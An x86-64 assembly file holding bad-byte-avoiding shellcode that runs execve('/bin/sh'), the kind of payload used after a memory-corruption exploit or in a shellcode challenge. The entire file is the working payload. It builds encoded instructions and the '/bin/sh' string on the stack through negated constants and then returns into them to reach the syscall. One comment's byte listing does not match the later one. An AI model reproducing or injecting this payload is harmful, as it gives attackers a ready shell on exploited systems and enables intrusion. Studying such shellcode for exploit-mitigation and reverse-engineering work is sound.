;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; exec "/bin/sh" in 100 bytes
; bad bytes: 00 0a 0d 2f ff 0f 05 68 and 40 to 65

[BITS 64]

%define SYS_EXEC 59

[SECTION .TEXT]
	global _start

_start:
	; set rax=SYS_EXEC, rdx=0, rsi=0
	sub eax, eax
	mov al, SYS_EXEC
	sub edx, edx
	sub esi, esi

	; the hardest part is to set rdi points to "/bin/sh"
	; and do a 'syscall' with out bad bytes, I did this
	; in three steps.

	; Step 1: use 'enter' to store 'rsp+8' at [rsp]	
	xor sp, sp
	pushf
	enter 0x0108, 1
	add sp, 0x0108

	; Step 2: write the codes and the data at rsp+8
	mov ebp, -0x247c8d48
	neg ebp
	mov dword [rsp+8], ebp
	mov ebp, -0x2f050f07
	neg ebp
	mov dword [rsp+12], ebp
	mov ebp, -0x2f6e6962
	neg ebp
	mov dword [rsp+16], ebp
	sub ebp, ebp
	mov bp, -0x6873
	neg bp
	mov dword [rsp+20], ebp

	; Now we have: [rsp] = rsp+8
	;              [rsp+8] = '48 8d 72 24 ....' (lea rdi, [rsp+7]....)

	; Step 3: do 'ret'.
	ret

_unreached:
	; the codes writed at rsp+8	
	; lea rdi, [rsp+7]			; 48 8d 7c 24 07
	; syscall					; 0f 05
	; db "/bin/sh", 0, 0		; 2f 62 69 6e 2f 73 68 00 00
